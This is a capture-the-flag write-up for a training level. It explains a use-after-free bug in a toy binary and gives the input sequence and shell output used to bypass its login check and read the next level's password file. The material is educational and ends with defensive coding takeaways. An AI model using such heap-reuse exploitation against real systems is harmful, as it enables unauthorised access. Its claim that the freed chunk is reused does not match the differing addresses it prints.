# Level 8 — Use-After-Free (Auth Bypass)

## Overview

This level is based on a **use-after-free vulnerability**.

The program:

* Frees a pointer (`auth`)
* Keeps using it afterward
* Reuses the same heap memory for another variable (`service`)

Goal:

```
system("/bin/sh")
```

---

## 1. Key Idea

After `free(auth)`, the pointer is **not reset**.

If another allocation reuses the same memory, we can control what `auth` sees.

---

## 2. Variables

```
auth    → global pointer
service → global pointer
```

---

## 3. Available Commands

```
auth <data>
reset
service <data>
login
```

---

## 4. Program Logic

### auth

```c
auth = malloc(4);
auth[0] = 0;

if (len(input) <= 30)
    strcpy(auth, input);
```

* Allocates only 4 bytes
* Copies up to 30 bytes

---

### reset

```c
free(auth);
```

* Memory is freed
* ❌ Pointer NOT cleared → dangling pointer

---

### service

```c
service = strdup(input);
```

* Allocates new memory
* Often reuses the freed chunk

---

### login

```c
if (auth[32] != 0)
    system("/bin/sh");
```

---

## 5. Vulnerability

Sequence:

```
auth A
reset
service AAAAA...
```

Result:

```
auth    → freed memory
service → same memory reused
```

👉 Both point to the **same area**

---

## 6. Exploit Idea

We control `service`, but `auth` points to same memory.

So we make:

```
auth[32] != 0
```

---

## 7. Steps to Exploit

```bash
./level8
```

```
auth A
reset
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
login
```

---

## 8. Real Execution (Example)

```bash
./level8 
(nil), (nil)

auth A
0x804a008, (nil) 

reset
0x804a008, (nil) 

service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018 

login
$ cat /home/user/level9/.pass
```

---

## 9. Explanation of the Output

* `auth A`
  → `auth = 0x804a008`

* `reset`
  → memory freed, but pointer still shows same address

* `service ...`
  → new allocation near/over same heap (`0x804a018`)
  → memory reused / overlaps

* `login`
  → `auth[32] = 'A'` (non-zero)
  → condition is TRUE
  → shell executed

---

## 10. Why It Works

* Use-after-free bug
* Memory reuse by `malloc/strdup`
* Dangling pointer (`auth`)
* Logic check bypassed

---

## 11. Key Takeaways

* Never use pointers after `free`
* Always set pointer to `NULL`
* Heap reuse is predictable in simple binaries
* Logic bugs can be exploited without classic overflow

---
